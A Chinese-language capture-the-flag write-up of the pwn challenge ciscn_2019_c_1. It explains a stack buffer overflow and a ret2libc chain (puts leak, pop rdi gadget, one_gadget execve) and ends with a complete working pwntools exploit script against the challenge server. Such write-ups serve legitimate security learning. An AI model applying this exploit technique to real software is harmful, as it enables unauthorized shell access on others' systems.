首先还是看一下安全机制

![image-20200521213720001](https://static.hack1s.fun/images/2021/02/06/image-20200521213720001.png)

是个64位程序，开了NX

运行的时候是一个加密解密的程序

![image-20200521213626806](https://static.hack1s.fun/images/2021/02/06/image-20200521213626806.png)

选择加密的话可以返回密文，但是选择解密会告诉你让你自己解

拖到IDA看一看

main函数代码反编译的挺清晰

![image-20200521214208274](https://static.hack1s.fun/images/2021/02/06/image-20200521214208274.png)

这里在加密时输入的内容比较长的话会出现段错误

![image-20200521215200612](https://static.hack1s.fun/images/2021/02/06/image-20200521215200612.png)

encrypt函数这里s数组在输入时可能会溢出

![image-20200521215620358](https://static.hack1s.fun/images/2021/02/06/image-20200521215620358.png)

但是这次的程序里没有找到之前那几个题目里面那样可以直接得到shell或者是直接读flag的函数

所以需要ROP的技巧

查看got和plt表，发现没有exec和system之类的函数，所以不是简单的返回到代码段就可以做出来

这道题需要用ret2libc来做

1. 泄漏出某个函数的地址
2. 通过这个地址计算出libc的基址
3. 计算`system('/bin/sh')`的地址
4. 再次溢出，跳到system函数得到shell



可以看到这个encrypt函数没有对s的输入长度进行限制，如果我们希望溢出的话，首先要覆盖50h长度到达rbp，之后覆盖8个字节，即64位的rbp，最后是返回地址

payloads大概是这样的:

```python
payloads = 'a'*0x50 + 'a'*0x8 + ret_addr
```



逆向代码中看到调用了puts，所以首先可以利用这个puts函数泄漏libc的基地址

64位程序传递参数时，如果参数少于7个，会依次放在rdi、rsi、rdx、rcx、r8、r9中

后面的参数才会放在栈中

所以首先要获取到的gadget就是能从栈中将数据传入到rdi的

![image-20200522173556823](https://static.hack1s.fun/images/2021/02/06/image-20200522173556823.png)

通过ROPgadget获取到`pop rdi`的地址



泄漏puts地址的思路主要是通过rop运行puts函数，同时控制参数使得输出的内容是puts在got表中的真实值，这样就可以输出puts在内存中的实际地址

```python
payloads = 'a'*0x58 + pop_rdi + puts_got + puts_plt + start
```

这里面加入这一个start，是希望在执行完`pop rdi; ret`的时候能够回到程序开始的位置



但是实际上，构造好了payload之后，在encrypt函数return之前，对数组s进行了一个操作，就是上面逆向代码中循环的部分，好在这个操作不是很难，直接是通过ascii对字符简单的异或，因此我们的payload在发送之前也经过一个对应的解密操作就可以了



获取到puts的真实地址后就可以计算出实际的libc基地址

之后利用one_gadget搜索这个给定的libc中存在的`execve("/bin/sh")`

![image-20200625064345899](https://static.hack1s.fun/images/2021/02/06/image-20200625064345899.png)

测试之后第二个地址是可以使用的，另外两个都会崩溃

通过偏移计算出对应的实际地址

最后再一次执行main函数，溢出到这个位置即可

```python
from pwn import *

def encrypt(s):
    s = ord(s)
    if s<=96 or s>122:
        if s<=64 or s >90:
            if s>47 and s<=57:
                return chr(s^0xf)
            else:
                return chr(s)
        else:
            return chr(s^0xe)
    else:
        return chr(s^0xd)

#io = process('./ciscn_2019_c_1')
io = remote('node3.buuoj.cn','27487')
elf = ELF('./ciscn_2019_c_1')

libc = ELF('./libc-2.27.so')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
start = elf.sym['main']

pop_rdi = 0x400c83
# pop rdi; ret

payloads1 = 'a'*0x50 + 'a'*0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)
payloads1 = ''.join([encrypt(x) for x in payloads1])


io.sendlineafter('Input your choice!\n','1')
io.sendlineafter('encrypted\n',payloads1)

io.recvuntil('Ciphertext\n')
io.recvuntil('\n')

puts_real = u64(io.recvuntil('\n',drop=True).ljust(8,'\x00'))

print(puts_real)

libc_base = puts_real - libc.sym['puts']

execve_real = libc_base+ 0x4f322
# 0x4f2c5 
# 0x4f322
# 0x10a38c

io.sendlineafter('Input your choice!\n','1')

payloads2 = 'a'*0x58 + p64(execve_real)
io.sendlineafter('encrypted\n',payloads2)
io.recv()
io.interactive()
```

